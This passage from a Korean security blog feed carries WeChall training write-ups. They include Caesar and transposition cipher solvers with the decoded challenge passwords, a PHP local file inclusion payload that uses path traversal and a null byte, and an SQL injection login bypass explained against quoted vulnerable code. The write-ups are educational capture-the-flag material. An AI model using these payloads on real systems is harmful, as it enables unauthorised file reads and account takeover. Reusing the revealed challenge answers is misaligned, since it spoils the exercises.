+ C = (P + K) % 26&lt;/p&gt;
+
+&lt;p&gt;이러한 치환 암호의 문제점은 알파벳의 출현 빈도 수가 그대로 노출되어 암호문에 남아있다는 것이다. 이떄 통계적 성질을 이용하여 암호를 풀어낼 수 있다.
+ 보통 알파벳의 경우 e, t, a, s, i, n, … 순으로 출현 빈도가 나타난다.&lt;/p&gt;
+
+&lt;p&gt;보통 치환 암호는 암호문과 암호키 간의 관계를 숨기는 혼돈(confusion)의 성질을 만족시킨다.&lt;/p&gt;
+
+&lt;p&gt;이번 문제에서는 아스키 코드를 사용할 수 있도록 하여 키의 크기가 26에서 128로 늘어났다는 점에 주의한다.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-Python&quot;&gt;ciphertext = &quot;63 0B 0B 00 20 06 0B 7E 48 20 15 0B 11 20 0F 0B\
+ 08 12 01 00 20 0B 0A 01 20 09 0B 0E 01 20 7F 04\
+ 7D 08 08 01 0A 03 01 20 05 0A 20 15 0B 11 0E 20\
+ 06 0B 11 0E 0A 01 15 4A 20 70 04 05 0F 20 0B 0A\
+ 01 20 13 7D 0F 20 02 7D 05 0E 08 15 20 01 7D 0F\
+ 15 20 10 0B 20 7F 0E 7D 7F 07 4A 20 73 7D 0F 0A\
+ 43 10 20 05 10 5B 20 4D 4E 54 20 07 01 15 0F 20\
+ 05 0F 20 7D 20 0D 11 05 10 01 20 0F 09 7D 08 08\
+ 20 07 01 15 0F 0C 7D 7F 01 48 20 0F 0B 20 05 10\
+ 20 0F 04 0B 11 08 00 0A 43 10 20 04 7D 12 01 20\
+ 10 7D 07 01 0A 20 15 0B 11 20 10 0B 0B 20 08 0B\
+ 0A 03 20 10 0B 20 00 01 7F 0E 15 0C 10 20 10 04\
+ 05 0F 20 09 01 0F 0F 7D 03 01 4A 20 73 01 08 08\
+ 20 00 0B 0A 01 48 20 15 0B 11 0E 20 0F 0B 08 11\
+ 10 05 0B 0A 20 05 0F 20 00 02 0C 05 02 05 09 0A\
+ 03 05 0F 04 4A&quot;
+cipher = ciphertext.split(&quot; &quot;)
+
+for j in range(0, 127):
+	for i in cipher:
+		print(chr((int(&quot;0x&quot; + i, 0)+j)%128), end=&quot;&quot;)
+	print(&quot;&quot;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;위 코드를 실행시키면 결과물 중 아래와 같은 문장을 얻을 수 있다.&lt;/p&gt;
+
+&lt;p&gt;Goodjob,yousolvedonemorechallengeinyourjourney.Thisonewasfairlyeasytocrack.Wasn’tit?128keysisaquitesmallkeyspace,soitshouldn’thavetakenyoutoolongtodecryptthismessage.Welldone,yoursolutionisdfpifimngish.&lt;/p&gt;
+
+&lt;p&gt;출처: http://www.wechall.net/challenge/training/crypto/caesar2/index.php&lt;/p&gt;
+
+&lt;h1 id=&quot;wechall-training-transposition-2-write-up&quot;&gt;(Wechall) Training Transposition 2 write up&lt;/h1&gt;
+&lt;p&gt;전치 암호는 key에 따라 문자의 순서를 바꾸는 암호화 방식이다.&lt;/p&gt;
+
+&lt;p&gt;전치 암호는 암호문과 평문의 관계를 숨기는 확산(Difussion) 성질을 만족시킨다.&lt;/p&gt;
+
+&lt;p&gt;‘oWdnreuf’에서 암호화 키가 [2, 1]임을 유추할 수 있다.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-Python&quot;&gt;cipher = &quot;oWdnreuf.lY uoc nar ae dht eemssga eaw yebttrew eh nht eelttre srax enic roertco drre.Ihtni koy uowlu dilekt oes eoyrup sawsro don: wc lfoediorbp.e&quot;
+keysize = 2
+key = [2, 1]
+
+for i in range(0, int(len(cipher)/keysize)):
+	snippet = cipher[i*keysize:i*keysize+keysize]
+	for k in key:
+		print(snippet[k-1], end=&quot;&quot;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Wonderful. You can read the message way better when the letters are in correct order. I think you would like to see your password now: cfleoidropbe.&lt;/p&gt;
+
+&lt;p&gt;출처: http://www.wechall.net/challenge/training/crypto/transposition1/index.php&lt;/p&gt;
+
+&lt;h1 id=&quot;wechall-training-php-lfi-local-file-inclusion-write-up&quot;&gt;(Wechall) Training PHP LFI (Local File Inclusion) write up&lt;/h1&gt;
+
+&lt;p&gt;LFI 취약점은 공격 대상 서버에 있는 파일을 포함시켜 공격한다. 보통 include 부분에 입력값 검증 등 적절한 보안 조치가 없을 경우에 발생한다.
+cf. RFI (Remote File Inclusion)&lt;/p&gt;
+
+&lt;p&gt;filename에 대한 검증 없이 include를 해 취약점 발생&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-PHP&quot;&gt;$filename = 'pages/'.(isset($_GET[&quot;file&quot;])?$_GET[&quot;file&quot;]:&quot;welcome&quot;).'.html';
+include $filename;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;?file=../../solution.php 를 통해 해당 파일을 불러오고 %00을 통해 끝에 .html이 붙지 않도록 한다. (Null byte injection)&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-PHP&quot;&gt;https://www.wechall.net/challenge/training/php/lfi/up/index.php?file=../../solution.php%00
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;출처: http://www.wechall.net/challenge/training/php/lfi/up/index.php&lt;/p&gt;</content><author><name>Yongjin Han</name></author><summary type="html">(Wechall) Training Regex write up</summary></entry><entry><title type="html">(Wechall) MySQL I</title><link href="http://localhost:4000/security/(Wechall)-MYSQL1/" rel="alternate" type="text/html" title="(Wechall) MySQL I" /><published>2021-01-13T18:24:00+09:00</published><updated>2021-01-13T18:24:00+09:00</updated><id>http://localhost:4000/security/(Wechall)-MYSQL1</id><content type="html" xml:base="http://localhost:4000/security/(Wechall)-MYSQL1/">&lt;h1 id=&quot;wechall-mysql-1-write-up&quot;&gt;(Wechall) MySQL 1 write up&lt;/h1&gt;
+
+&lt;p&gt;아래 주어진 코드를 통해 쿼리문을 살펴보면 쿼리문에 대해 별다른 처리가 되지 않은 것을 알 수 있다. (prepared statement x)
+따라서 사용자 입력 값에 따라 DB를 조회하는 SQL injection 취약점이 존재한다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/104435989-66baaa80-55d0-11eb-9efb-4180f83373eb.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;위 값을 입력하여 admin 계정으로 시스템에 로그인을 시도했다.
+admin은 관리자 계정, ‘는 username 값이 끝났음을 명시한다. 주석처리#을 통해서 이후 오는 조건절을 무시하도록 한다.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-Java&quot;&gt;/**
+ * Exploit this!
+ * @param WC_Challenge $chall
+ * @param unknown_type $username
+ * @param unknown_type $password
+ * @return boolean
+ */
+function auth1_onLogin(WC_Challenge $chall, $username, $password)
+{
+	$db = auth1_db();
+	
+	$password = md5($password);
+	
+	$query = &quot;SELECT * FROM users WHERE username='$username' AND password='$password'&quot;;
+	
+	if (false === ($result = $db-&amp;gt;queryFirst($query))) {
+		echo GWF_HTML::error('Auth1', $chall-&amp;gt;lang('err_unknown'), false); # Unknown user
+		return false;
+	}
+
+	# Welcome back!
+	echo GWF_HTML::message('Auth1', $chall-&amp;gt;lang('msg_welcome_back', htmlspecialchars($result['username'])), false);
+	
+	# Challenge solved?
+	if (strtolower($result['username']) === 'admin') {
+		$chall-&amp;gt;onChallengeSolved(GWF_Session::getUserID());
+	}
+	
+	return true;
+}
+&lt;/code&gt;&lt;/pre&gt;</content><author><name>Yongjin Han</name></author><summary type="html">(Wechall) MySQL 1 write up</summary></entry></feed>
